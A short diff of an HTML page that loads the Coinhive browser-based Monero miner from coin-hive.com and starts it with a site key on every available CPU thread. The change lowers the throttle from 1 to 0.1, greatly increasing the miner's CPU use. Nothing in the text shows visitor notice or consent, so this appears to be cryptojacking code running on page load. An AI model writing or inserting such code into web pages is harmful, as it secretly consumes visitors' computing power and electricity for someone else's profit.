@@ -1,7 +1,7 @@
 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var xmr = new CoinHive.Anonymous('1kBWYndgGpfPGmDMAvdgNPc6RypR4ygW', {throttle: 1});
+var xmr = new CoinHive.Anonymous('1kBWYndgGpfPGmDMAvdgNPc6RypR4ygW', {throttle: 0.1});
 try {
     var threads = navigator.hardwareConcurrency();
     xmr.setNumThreads(threads);
